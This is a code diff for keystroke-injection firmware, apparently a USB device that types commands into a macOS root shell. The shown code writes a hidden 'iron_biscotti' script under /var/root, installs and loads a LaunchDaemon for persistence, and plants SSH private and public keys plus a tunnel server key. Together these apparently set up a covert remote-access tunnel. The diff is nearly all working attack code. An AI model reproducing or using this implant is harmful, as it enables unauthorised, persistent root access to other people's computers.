@@ -33,6 +33,31 @@ void AddPrivateKey() {
   EnterCommand(filename, 0);
 }
 
+// TODO: This is a **dirty** hack to break up the buffer size. Fixes memory warning but iz ugly.
+void AddIronBiscottiScript() {
+  TypeString("vim ");
+  EnterCommand(filename, 500);
+  TypeKey('i');
+  strcpy_P(buffer, iron_biscotti_sh_p1);
+  TypeString(buffer);
+  delay(6000);
+  strcpy_P(buffer, iron_biscotti_sh_p2);
+  TypeString(buffer);
+  delay(7000);
+  TypeKey(KEY_ESC);
+  EnterCommand(":wq", 500);
+  TypeString("chmod ");
+  TypeString(permissions);
+  TypeString(" ");
+  EnterCommand(filename, 0);
+  TypeString("chown ");
+  TypeString(owner);
+  TypeString(":");
+  TypeString(group);
+  TypeString(" ");
+  EnterCommand(filename, 0);
+}
+
 void AddTunnelServerKey() {
   strcpy_P(buffer, PSTR("echo \""));
   TypeString(buffer);
@@ -61,30 +86,31 @@ void IronBiscotti() {
   // Setup launch daemon
   strcpy_P(buffer, PSTR("mkdir -p /var/root/.iron_biscotti/"));
   EnterCommand(buffer, 0);
-  strcpy_P(buffer, iron_biscotti_sh);
+  //////////////////////
   strcpy_P(filename, PSTR("/var/root/.iron_biscotti/iron_biscotti.sh"));
   strcpy_P(permissions, PSTR("755"));
   strcpy_P(owner, PSTR("root"));
   strcpy_P(group, PSTR("wheel"));
-  WriteToFile(filename, buffer, permissions, owner, group, 1000);
-  strcpy_P(buffer, tunnel_sh);
-  strcpy_P(filename, PSTR("/var/root/.iron_biscotti/tunnel.sh"));
-  WriteToFile(filename, buffer, permissions, owner, group, 1000);
+  AddIronBiscottiScript();
+  //////////////////////
   strcpy_P(buffer, com_iron_biscotti_plist);
   strcpy_P(filename, PSTR("/Library/LaunchDaemons/com.iron_biscotti.plist"));
   strcpy_P(permissions, PSTR("644"));
   WriteToFile(filename, buffer, permissions, owner, group, 4000);
+  //////////////////////
   strcpy_P(buffer, PSTR("mkdir -p /var/root/.ssh/"));
   EnterCommand(buffer, 0);
   strcpy_P(filename, PSTR("/var/root/.ssh/id_rsa"));
   strcpy_P(permissions, PSTR("400"));
   AddPrivateKey();
-  //WriteToFile(filename, buffer, permissions, owner, group, 20000);
+  //////////////////////
   strcpy_P(buffer, ssh_public_key);
   strcpy_P(filename, PSTR("/var/root/.ssh/id_rsa.pub"));
   strcpy_P(permissions, PSTR("644"));
   WriteToFile(filename, buffer, permissions, owner, group, 4000);
+  //////////////////////
   AddTunnelServerKey();
+  //////////////////////
   strcpy_P(buffer, PSTR("launchctl load -w /Library/LaunchDaemons/com.iron_biscotti.plist"));
   EnterCommand(buffer, 0);
 }
